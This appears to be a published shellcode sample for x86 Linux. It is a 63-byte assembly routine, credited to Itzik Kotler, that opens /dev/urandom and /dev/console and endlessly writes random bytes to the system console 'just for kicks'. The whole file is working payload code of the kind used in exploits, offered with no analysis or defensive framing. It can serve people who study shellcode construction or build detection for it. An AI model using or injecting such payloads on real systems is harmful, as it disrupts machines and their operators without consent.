#
# (linux/x86) cat /dev/urandom > /dev/console, no real profit just for kicks - 63 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:

		xorl %ecx, %ecx

		pushl %ecx
		pushl $0x6d6f646e
		pushl $0x6172752f
		pushl $0x7665642f

		movl %esp, %ebx
		movb $0x2, %cl

	_openit:

		pushl $0x5
		popl %eax
		cdq
		int $0x80

		xchg %eax, %esi

		popl %edi
		popl %ebp
		popl %ebp
		pushl $0x656c6f73
		pushl $0x6e6f632f
		pushl %edi

		loop _openit

		movl %eax, %ebx

	_makeio:

                movb $0x4, %dl
                movl %esp, %ecx

	_pre_ioloop:

                movb $0x3, %al
		clc

	_ioloop:

	        int $0x80
                xchg %ebx, %esi
		jc _pre_ioloop
		stc
		jmp _ioloop
